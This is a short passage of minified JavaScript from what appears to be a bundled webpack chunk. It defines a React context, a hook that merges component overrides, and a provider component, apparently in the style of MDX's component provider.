t={},a=s.createContext(t);function r(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:r(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);